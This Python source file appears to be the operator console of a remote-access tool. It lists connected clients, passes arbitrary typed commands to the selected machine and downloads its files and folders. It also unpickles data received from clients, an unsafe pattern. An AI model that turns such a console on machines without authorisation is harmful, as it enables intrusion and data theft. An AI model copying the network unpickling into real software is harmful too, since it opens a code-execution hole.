from ast import While
import os
import cmd
import pickle
from re import L
import threading
import time

from rich.progress import SpinnerColumn
from typing import List
from utils import get_size, print_files, print, Ziper, progress


CHUNK_SIZE: int = 1024 * 512


class Cmdl(cmd.Cmd):
    def __init__(self, server_self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.server = server_self
        self.files_complete: List[str] = []
        self.client_path: str = "~"
        self.percent: str = ""

    def do_clients(self, arg: str) -> None:
        index: int = 0
        for i, addr in self.server.clients:
            print(f"[{index}] {addr[0]}:{addr[1]}")
            index += 1

    def do_move(self, arg: str) -> None:
        try:
            if int(arg) <= len(self.server.clients)-1:
                self.server.active_client_index = int(arg)
                self.do_cd(".")
            else:
                print(f"# please select between {list(range(len(self.server.clients)))}.")
        except Exception as e:
            print(e)

    def do_ls(self, arg: str) -> None:
        self.server.send(f"ls {arg}".encode("utf-8"))
        unpickled_data: dict = self.server.recv_pickled_data()
        if unpickled_data["status"]:
            print_files(unpickled_data["content"])
        else:
            print(unpickled_data["error"])

    def do_cd(self, arg: str) -> None:
        self.server.send(f"cd {arg}".encode("utf-8"))
        rc: dict = self.server.recv_pickled_data()
        if rc["status"]:
            self.files_complete = rc["content"][0]
            self.client_path = rc["content"][1]
        else:
            print(rc["error"])
    # def do_pwd(self, arg: str) -> None:
    #     self.server.send("pwd")

    def default(self, line: str) -> None:
        self.server.send(line.encode("utf-8"))
        print(self.server.recv())

    def postcmd(self, stop: bool, line: str) -> bool:
        self.server.refresh_cmd()
        print(self.prompt, end="")
        self.prompt=""
        return super().postcmd(stop, line)

    def show_thread_percent(self) -> None:
        def show_percent() -> None:
            with progress("Downloading") as p:
                while self.percent:
                    p.update(0, description=self.percent)
                    time.sleep(0.1)
        self.percent = "..."
        thread = threading.Thread(target=show_percent)
        thread.start()
        return thread

    def do_download(self, path) -> None:
        self.server.send(f"download {path}".encode('utf-8'))
        print(f"# zipping '{path}' in client ...")
        rc: dict = self.server.recv_pickled_data()
        path: str = os.path.join(os.getcwd(), os.path.basename(path))

        if rc["status"]:
            if rc["content"]['isdir']:
                path += ".zip"
            size: int = rc["content"]["size"]
            print("# Start download ", get_size(size), "...")
            r = size
            thread = self.show_thread_percent()
            with open(os.path.basename(path), "wb") as f:
                while r and r > 0:
                    gets: int = CHUNK_SIZE if r >= CHUNK_SIZE else r
                    data: bytes = self.server.active_client.recv(gets)
                    f.write(data)
                    r -= gets
                    self.percent = f"[cyan]{str((size-r)/size*100).split('.')[0]}%[/cyan]"
                self.percent = ""
                thread.join()

            if rc["content"]['isdir']:
                Ziper.unZip(path)
                os.remove(path)
            print("[bold][blue]# DONE  ✓[/blue][/bold]")
        else:
            print(rc["error"])
            print("[bold][red]# ERROR  ✗[/red][/bold]")
